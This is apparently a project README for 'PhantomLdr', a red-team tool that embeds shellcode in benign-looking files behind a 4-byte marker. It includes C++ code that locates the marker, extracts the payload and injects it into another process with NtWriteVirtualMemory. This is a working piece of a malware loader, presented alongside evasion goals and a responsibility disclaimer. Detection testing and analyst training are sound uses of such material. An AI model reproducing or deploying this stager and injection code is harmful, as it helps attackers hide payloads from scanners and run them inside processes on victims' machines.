# PhantomLdr

![Status](https://img.shields.io/badge/status-stable-green?style=flat-square)
![Python](https://img.shields.io/badge/python-3.x-blue?style=flat-square)

**PhantomLdr** is a binary stager tool designed for red team operators and malware analysts. It embeds raw shellcode into benign-looking files using a 4-byte marker, simulating payload delivery and file manipulation techniques observed in advanced persistent threats (APT).

> ⚠️ **Disclaimer:** This tool is for **educational and authorized security research only**. Use it in **isolated environments** or during **authorized penetration testing engagements**. The developer assumes no responsibility for misuse.

---

## 🎯 Use Case

PhantomLdr is ideal for:

- Red Team payload staging simulations
- Malware evasion and forensic evasion research
- Detection rule testing (EDR, AV, YARA)
- Malware reverse engineering training labs

---

## ✨ Features

- Embeds arbitrary shellcode into any non-sensitive file
- Avoids tampering with sensitive/critical extensions (e.g., `.exe`, `.dll`)
- Custom 4-byte ASCII marker for locating payload in post-processing

---

## ⚙️ Requirements

- Python 3.x
- [pyfiglet](https://pypi.org/project/pyfiglet/)

Install dependencies:

```bash
pip install pyfiglet
```

## How to implement on Visual studio

```cpp
std::vector<char> extractShellcode(const char* data, size_t size, const char* marker = "Z3R0") {
	if (!marker || strlen(marker) != 4) {
		return {};
	}

	for (size_t i = 0; i < size - 8; ++i) {
		if (data[i] == marker[0] &&
			data[i + 1] == marker[1] &&
			data[i + 2] == marker[2] &&
			data[i + 3] == marker[3]) {

			uint32_t len = *(uint32_t*)&data[i + 4];

			if (i + 8 + len > size) {
				return {};
			}

			return std::vector<char>(data + i + 8, data + i + 8 + len);
		}
	}

	return {};
}

std::vector<char> buffer = extractShellcode(data, size, marker);
NtWriteVirtualMemory(pi.hProcess, remoteAddr, buffer.data(), buffer.size(), NULL);
```
